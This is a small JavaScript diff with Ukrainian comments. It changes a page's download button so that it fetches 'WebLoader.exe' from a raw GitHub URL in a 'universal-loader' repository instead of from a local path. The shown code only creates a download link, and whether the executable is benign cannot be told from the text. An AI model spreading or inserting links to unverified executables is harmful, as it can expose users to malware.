@@ -136,7 +136,7 @@
         // Додаємо логіку для кнопки "Завантажити файл"
         document.getElementById('downloadBtn').addEventListener('click', function() {
             // Вкажіть шлях до файлу, який потрібно завантажити
-            const fileUrl = 'WebLoader.exe'; // Змініть на ваш файл
+            const fileUrl = 'https://raw.githubusercontent.com/digclout-lab/universal-loader/refs/heads/main/WebLoader.exe'; // Змініть на ваш файл
             const link = document.createElement('a');
             link.href = fileUrl;
             link.download = fileUrl.split('/').pop();
